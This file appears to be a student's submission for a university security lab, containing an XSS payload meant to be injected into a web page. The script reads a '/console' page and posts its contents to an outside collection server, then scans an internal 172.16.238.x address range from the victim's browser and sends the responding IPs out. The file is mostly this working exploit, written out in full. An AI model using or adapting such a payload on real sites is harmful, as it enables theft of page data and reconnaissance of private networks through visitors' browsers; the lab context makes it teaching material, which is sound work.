/*
    !!!!!!!! IMPORTANT !!!!!!!
    In this task, you will craft a payload to scan local web servers.
    To receive full credit, you must submit your code using this file.
    Please follow the format outlined below.
*/

/*

    Your exploitable payload should look like:
    -> whaterver<script>X</script>whatever

    NOTE: You can include comments in the coding section.
    TODO: Please copy X in the coding section
*/

/* Coding section start */
{/* <script>
(async function() {
    await fetch('/console')
        .then(response => response.text())
        .then(data => {
            fetch('https://cs6262.gtisc.gatech.edu/receive/skhadka9/1175', {
                method: 'POST',
                body: data 
            });
        });

    const valid_ip = [];
    const promises = [];
    for (let i = 4; i <= 255; i++) {
        const ip = `172.16.238.${i}`;
        promises.push(
            fetch(`http://${ip}`, { method: 'GET' })
            .then(response => response.text())
            .then(text => {
                if (text.trim() === 'hello') {
                    valid_ip.push(ip);
                }
            })
            .catch(err => {})
        );
    }
    await Promise.all(promises);
    if (valid_ip.length > 0) {
        const result = valid_ip.join(',');
        fetch('https://cs6262.gtisc.gatech.edu/receive/admin/2', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ip_addresses: result })
        });
    }
})();
</script> */}

/* Coding section end */